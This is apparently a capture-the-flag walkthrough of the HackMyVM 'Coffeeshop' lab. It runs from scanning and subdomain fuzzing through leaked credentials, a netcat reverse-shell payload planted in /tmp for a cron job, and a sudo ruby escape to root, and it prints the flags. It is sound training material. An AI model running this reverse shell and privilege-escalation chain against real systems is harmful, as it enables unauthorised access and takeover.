| Name       | Difficulty | OS    | Target IP     | Link                                                   |
| ---------- | ---------- | ----- | ------------- | ------------------------------------------------------ |
| Coffeeshop | Easy       | Linux | 192.168.0.202 | https://hackmyvm.eu/machines/machine.php?vm=CoffeeShop |

### Arp Scan 

```bash
garffff@garffff:~/hackmyvm/coffeeshop$ sudo arp-scan -l | grep 97  
192.168.0.175	08:00:27:2a:fe:97	PCS Systemtechnik GmbH
```

### Nmap Scan Results

```bash
garffff@garffff:~/hackmyvm/coffeeshop$ sudo nmap -p- -sV -sC 192.168.0.175 -oA nmap/coffeeshop.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-30 17:44 BST
Nmap scan report for 192.168.0.175
Host is up (0.000079s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Under Construction - Midnight Coffee
MAC Address: 08:00:27:2A:FE:97 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.72 seconds
```

### Exploring Port 80

![[Pasted image 20240730174501.png]]

Adding `midnight.cofee` to the host file

```bash
garffff@garffff:~/hackmyvm/coffeeshop$ echo '192.168.0.175 midnight.coffee' | sudo tee -a /etc/hosts
```

### Directory Bruteforcing

```bash
garffff@garffff:~/hackmyvm/coffeeshop$ fuf -u http://midnight.coffee/FUZZ -w /opt/SecLists/Discovery/Web-Content/big.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://midnight.coffee/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 33ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 128ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 0ms]
shop                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 0ms]
:: Progress: [20476/20476] :: Job [1/1] :: 42 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Visiting the /shop directory, we come across a login page:

![[Pasted image 20240730175834.png]]

### Virtual Host Sub Domain Enumeration

A subdomain of `dev` is discovered:

```bash
garffff@garffff:~/hackmyvm/coffeeshop$ ffuf -u http://midnight.coffee/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.midnight.coffee" -fs 1690

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://midnight.coffee/
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.midnight.coffee
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 1690
________________________________________________

dev                     [Status: 200, Size: 1738, Words: 575, Lines: 72, Duration: 255ms]
:: Progress: [114441/114441] :: Job [1/1] :: 8333 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

Adding dev to the host file:

```bash
echo '192.168.0.175 dev.midnight.coffee' | sudo tee -a /etc/hosts
```

Navigating to this new sub domain, credentials are displayed:

![[Pasted image 20240730180526.png]]

### Credentials

```bash
developer:developer
```

At the login page, and using those credentials, we see a new set of credentials:

![[Pasted image 20240730180656.png]]
### New Credentials

```bash
tuna:1L0v3_TuN4_Very_Much
```

These credentials work using SSH:

```bash
garffff@garffff:~/hackmyvm/coffeeshop$ ssh tuna@midnight.coffee
The authenticity of host 'midnight.coffee (192.168.0.175)' can't be established.
ED25519 key fingerprint is SHA256:BDdxu8eqrB8nO8JfJ3LfRnnT0gGHmaYMEIA1SfgIR6g.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'midnight.coffee' (ED25519) to the list of known hosts.
tuna@midnight.coffee's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jul 30 05:08:22 PM UTC 2024

  System load:             0.0087890625
  Usage of /:              47.8% of 14.01GB
  Memory usage:            15%
  Swap usage:              0%
  Processes:               132
  Users logged in:         0
  IPv4 address for enp0s3: 192.168.0.175
  IPv6 address for enp0s3: 2a00:23c6:2989:ca01:a00:27ff:fe2a:fe97


Expanded Security Maintenance for Applications is not enabled.

41 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jan  3 18:49:19 2024 from 10.0.2.8
tuna@coffee-shop:~$ whoami && id
tuna
uid=1002(tuna) gid=1002(tuna) groups=1002(tuna)
tuna@coffee-shop:~$ ls -lash
total 40K
4.0K drwxr-x--- 3 tuna tuna 4.0K Jan  3  2024 .
4.0K drwxr-xr-x 5 root root 4.0K Jan  3  2024 ..
4.0K -rw------- 1 tuna tuna  839 Jan  3  2024 .bash_history
4.0K -rw-r--r-- 1 tuna tuna  220 Jan  3  2024 .bash_logout
4.0K -rw-r--r-- 1 tuna tuna 3.7K Jan  3  2024 .bashrc
4.0K drwx------ 2 tuna tuna 4.0K Jan  3  2024 .cache
4.0K -rw-r--r-- 1 tuna tuna  807 Jan  3  2024 .profile
 12K -rw------- 1 tuna tuna 8.3K Jan  3  2024 .viminfo
```

No flag is found in Tuna's home directory.

### Privilege Escalation - First User

Looking at `/etc/crontab`, we see that the file `/home/shopadmin/execute.sh` is being executed every minute:

```bash
tuna@coffee-shop:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * /bin/bash /home/shopadmin/execute.sh
```

Tuna does not have permissions to view shopadmin's directory, however, it is possible to view the contents of the file:

```bash
tuna@coffee-shop:~$ ls -lash /home/shopadmin/
ls: cannot open directory '/home/shopadmin/': Permission denied
tuna@coffee-shop:~$ ls -lash /home/shopadmin/execute.sh
4.0K -rwxrwxr-x 1 shopadmin shopadmin 33 Jan  3  2024 /home/shopadmin/execute.sh
tuna@coffee-shop:~$ cat /home/shopadmin/execute.sh
#!/bin/bash

/bin/bash /tmp/*.sh
```

This is simply telling us that anything inside of the `/tmp` directory that has the `.sh` extension is being executed.

I will created an msfvenom payload:

```bash
garffff@garffff:~/hackmyvm/coffeeshop$ sudo msfvenom -p cmd/unix/reverse_netcat lhost=192.168.0.51 lport=9999         
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 90 bytes
mkfifo /tmp/kdiw; nc 192.168.0.51 9999 0</tmp/kdiw | /bin/sh >/tmp/kdiw 2>&1; rm /tmp/kdiw
```

Creating a reverse listener: 

```bash
garffff@garffff:~/hackmyvm/coffeeshop$ sudo nc -lvp 9999
Listening on 0.0.0.0 9999
```

Echo the MSFVenom payload to a file in the `/tmp` directory and make it executable:

```bash
tuna@coffee-shop:~$ echo 'mkfifo /tmp/kdiw; nc 192.168.0.51 9999 0</tmp/kdiw | /bin/sh >/tmp/kdiw 2>&1; rm /tmp/kdiw' > /tmp/shell.sh
tuna@coffee-shop:~$ chmod +x /tmp/shell.sh
```

After about a minute, a reverse shell is received as the user shopadmin:

```bash
garffff@garffff:~/hackmyvm/coffeeshop$ sudo nc -lvp 9999
Listening on 0.0.0.0 9999
Connection received on midnight.coffee 33696
whoami
shopadmin
```

Upgrading the to a fully interactive TTY connection:

```bash
garffff@garffff:~/hackmyvm/coffeeshop$ sudo nc -lvp 9999
Listening on 0.0.0.0 9999
Connection received on midnight.coffee 33696

whoami
shopadmin
whereis python3
python3: /usr/bin/python3 /usr/lib/python3 /etc/python3 /usr/share/python3 /usr/share/man/man1/python3.1.gz
python3 -c 'import pty;pty.spawn("/bin/bash")'
shopadmin@coffee-shop:~$ ^Z
[1]+  Stopped                 sudo nc -lvp 9999
garffff@garffff:~/hackmyvm/coffeeshop$ stty raw -echo
sudo nc -lvp 9999ackmyvm/coffeeshop$ 


shopadmin@coffee-shop:~$ whoami && id
whoami && id
shopadmin
uid=1001(shopadmin) gid=1001(shopadmin) groups=1001(shopadmin)
```

Grabbing the use flag:

```bash
shopadmin@coffee-shop:~$ cat user.txt	
DR1NK1NG-C0FF33-4T-N1GHT
```
### Privilege Escalation - Root

Issuing the command `sudo -l`, we can see what commands we can run as `sudo`:

```bash
shopadmin@coffee-shop:~$ sudo -l
Matching Defaults entries for shopadmin on coffee-shop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User shopadmin may run the following commands on coffee-shop:
    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb
```

Looks like we can run Ruby with any thing after it with the `/opt/shop.rb`.

I will use this as a reference: https://gtfobins.github.io/gtfobins/ruby/

![[Pasted image 20240730182429.png]]

In this demonstration, I will use bash instead of sh:

```bash
shopadmin@coffee-shop:~$ sudo /usr/bin/ruby -e 'exec "/bin/bash"' /opt/shop.rb
<do /usr/bin/ruby -e 'exec "/bin/bash"' /opt/shop.rb
root@coffee-shop:/home/shopadmin# whoami && id
whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```

Grabbing the root flag:

```bash
root@coffee-shop:/home/shopadmin# cd /root
cd /root
root@coffee-shop:~# ls -lash
ls -lash
total 64K
4.0K drwx------  6 root root 4.0K Feb  3 10:31 .
4.0K drwxr-xr-x 19 root root 4.0K Jan  3  2024 ..
8.0K -rw-------  1 root root 4.3K Feb  3 10:32 .bash_history
4.0K -rw-r--r--  1 root root 3.1K Oct 15  2021 .bashrc
4.0K drwx------  2 root root 4.0K Jan  3  2024 .cache
4.0K -rw-------  1 root root   20 Jan  3  2024 .lesshst
4.0K drwxr-xr-x  3 root root 4.0K Jan  3  2024 .local
4.0K -rw-------  1 root root 1.6K Jan  3  2024 .mysql_history
4.0K -rw-r--r--  1 root root  161 Jul  9  2019 .profile
4.0K -rw-r--r--  1 root root   25 Feb  3 10:31 root.txt
4.0K drwx------  3 root root 4.0K Jan  3  2024 snap
4.0K drwx------  2 root root 4.0K Jan  3  2024 .ssh
   0 -rw-r--r--  1 root root    0 Jan  3  2024 .sudo_as_admin_successful
 12K -rw-------  1 root root 9.7K Feb  3 10:31 .viminfo
root@coffee-shop:~# cat root.txt
cat root.txt
C4FF3331N-ADD1CCCTIONNNN
```